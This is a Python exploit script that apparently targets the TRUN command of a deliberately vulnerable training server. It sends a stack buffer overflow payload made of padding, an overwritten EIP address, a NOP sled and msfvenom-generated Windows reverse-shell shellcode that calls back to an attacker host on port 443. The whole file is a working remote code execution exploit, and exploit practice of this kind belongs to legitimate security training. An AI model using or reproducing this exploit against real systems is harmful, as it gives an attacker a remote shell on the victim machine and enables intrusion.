#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f python -a x86 -b "\x00"
buf =  b""
buf += b"\xbd\x21\x3e\x1f\xb4\xd9\xc9\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x6b\x12\x03\x6b\x12\x83\xca\xc2\xfd"
buf += b"\x41\xf0\xd3\x80\xaa\x08\x24\xe5\x23\xed\x15\x25\x57"
buf += b"\x66\x05\x95\x13\x2a\xaa\x5e\x71\xde\x39\x12\x5e\xd1"
buf += b"\x8a\x99\xb8\xdc\x0b\xb1\xf9\x7f\x88\xc8\x2d\x5f\xb1"
buf += b"\x02\x20\x9e\xf6\x7f\xc9\xf2\xaf\xf4\x7c\xe2\xc4\x41"
buf += b"\xbd\x89\x97\x44\xc5\x6e\x6f\x66\xe4\x21\xfb\x31\x26"
buf += b"\xc0\x28\x4a\x6f\xda\x2d\x77\x39\x51\x85\x03\xb8\xb3"
buf += b"\xd7\xec\x17\xfa\xd7\x1e\x69\x3b\xdf\xc0\x1c\x35\x23"
buf += b"\x7c\x27\x82\x59\x5a\xa2\x10\xf9\x29\x14\xfc\xfb\xfe"
buf += b"\xc3\x77\xf7\x4b\x87\xdf\x14\x4d\x44\x54\x20\xc6\x6b"
buf += b"\xba\xa0\x9c\x4f\x1e\xe8\x47\xf1\x07\x54\x29\x0e\x57"
buf += b"\x37\x96\xaa\x1c\xda\xc3\xc6\x7f\xb3\x20\xeb\x7f\x43"
buf += b"\x2f\x7c\x0c\x71\xf0\xd6\x9a\x39\x79\xf1\x5d\x3d\x50"
buf += b"\x45\xf1\xc0\x5b\xb6\xd8\x06\x0f\xe6\x72\xae\x30\x6d"
buf += b"\x82\x4f\xe5\x22\xd2\xff\x56\x83\x82\xbf\x06\x6b\xc8"
buf += b"\x4f\x78\x8b\xf3\x85\x11\x26\x0e\x4e\xde\x1f\x24\x0e"
buf += b"\xb6\x5d\x44\x0f\xfc\xeb\xa2\x65\x12\xba\x7d\x12\x8b"
buf += b"\xe7\xf5\x83\x54\x32\x70\x83\xdf\xb1\x85\x4a\x28\xbf"
buf += b"\x95\x3b\xd8\x8a\xc7\xea\xe7\x20\x6f\x70\x75\xaf\x6f"
buf += b"\xff\x66\x78\x38\xa8\x59\x71\xac\x44\xc3\x2b\xd2\x94"
buf += b"\x95\x14\x56\x43\x66\x9a\x57\x06\xd2\xb8\x47\xde\xdb"
buf += b"\x84\x33\x8e\x8d\x52\xed\x68\x64\x15\x47\x23\xdb\xff"
buf += b"\x0f\xb2\x17\xc0\x49\xbb\x7d\xb6\xb5\x0a\x28\x8f\xca"
buf += b"\xa3\xbc\x07\xb3\xd9\x5c\xe7\x6e\x5a\x7c\x0a\xba\x97"
buf += b"\x15\x93\x2f\x1a\x78\x24\x9a\x59\x85\xa7\x2e\x22\x72"
buf += b"\xb7\x5b\x27\x3e\x7f\xb0\x55\x2f\xea\xb6\xca\x50\x3f"

offset = 2003

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    payload = b""
    payload += b"TRUN /.:/"
    payload += b"A" * offset # Padding
    payload += b"\xaf\x11\x50\x62" # EIP
    payload += b"\x90" * 100 # NOP sled
    payload += buf # Shellcode

    s.send(payload)
    s.close()

except:
    print("Error connecting to server")
    sys.exit()